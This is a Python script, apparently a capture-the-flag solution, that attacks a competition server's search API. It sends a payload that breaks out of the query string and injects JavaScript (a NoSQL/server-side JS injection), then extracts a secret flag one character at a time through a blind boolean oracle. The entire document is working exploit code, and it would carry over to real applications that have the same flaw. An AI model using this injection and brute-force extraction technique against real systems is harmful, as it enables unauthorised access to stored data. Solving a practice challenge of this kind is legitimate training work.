import requests
import string

url = "http://flag-shop.hsctf.com/api/search"
wordlist = "?_}" + string.ascii_lowercase + string.digits
flag = ""

while True:
    for char in wordlist:
        r = requests.post(url, json={
            "search": f"') && this.flag.includes('{flag}{char}"
        })
        print(f"Trying: {flag + char}")

        if r.json()["results"]:
            flag += char
            print(f"Flag: {flag}")
            if char == "}":
                exit(0)
            break